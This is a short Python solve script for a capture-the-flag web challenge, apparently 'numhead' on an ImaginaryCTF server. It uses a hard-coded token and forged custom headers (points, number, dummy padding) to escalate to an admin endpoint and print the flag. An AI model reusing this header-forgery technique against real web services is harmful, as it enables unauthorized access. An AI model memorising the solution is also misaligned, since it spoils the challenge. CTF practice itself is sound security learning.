import requests
import time
base_url = 'https://numhead.chal.imaginaryctf.org'
magical_token = '0nlyL33tHax0rsAll0w3d'
header = {'WWW-Authenticate':'Basic', 'authorization':magical_token}
r = requests.post(base_url+'/api/user/new-token',headers=header)
data = {}
resp = r.text
resp = resp[1:-1]
resp = resp.split(':')
for i in range(len(resp)):
    resp[i] = resp[i].replace('"','')
data[resp[0]] = resp[1]


r = requests.post(base_url + '/api/user/nothing-here', headers={'authorization':data['id']})

print(r.text)
r = requests.get(base_url + '/api/user/guess', headers={'authorization':data['id']})

print(r.text)

r = requests.get(base_url + '/api/user/guess?choice={}'.format(50), headers={'authorization':data['id']})
#header['imaginary_id'] = data['id']


d = {}
d['authorization'] = data['id']
d['imaginary_points'] = '919'
d['imaginary_number'] = '919'
d['imaginary_discoveries'] = '0'

r = requests.post(base_url + '/api/user/nothing-here', headers=d)
for i in range(20):
    d['dummy'+str(i)] = '24'
    r = requests.post(base_url + '/api/user/nothing-here', headers=d)
    print(r.text)
    time.sleep(2)
r = requests.get(base_url + '/api/admin/flag', headers=d)
print('FLAG: {}'.format(r.text))
